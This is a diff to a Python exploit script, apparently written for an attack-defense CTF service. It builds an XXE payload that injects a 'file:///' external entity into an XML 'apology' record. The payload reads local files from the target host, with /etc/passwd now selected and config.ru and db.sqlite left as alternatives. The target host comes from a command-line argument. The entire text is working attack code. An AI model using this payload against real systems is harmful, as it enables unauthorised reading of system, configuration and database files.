@@ -15,9 +15,9 @@ def create_headers(username, password):
 	return headers
 
 username = "FARGATETOP{}".format(randint(10000, 99999))
-# file_path = "/etc/passwd"
+file_path = "/etc/passwd"
 # file_path = "/usr/src/app/config.ru"
-file_path = "/usr/src/app/db.sqlite"
+# file_path = "/usr/src/app/db.sqlite"
 id_apology = gen_random_string()
 payload = """{}
 [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM 'file:///{}'>]><root><apologies direction="in"><apology id='{}' private='true' nickname='A_VOT_NE_SKAZU'><apology_text>&xxe;</apology_text></apology></apologies></root><!--""".format(username,file_path, id_apology)
@@ -26,7 +26,7 @@ password = "zzz"
 print(username, password)
 
 try:
-	host = sys.argv[0]
+	host = sys.argv[1]
 except:
 	host = "127.0.0.1"
 	# host = "6.6.1.2"
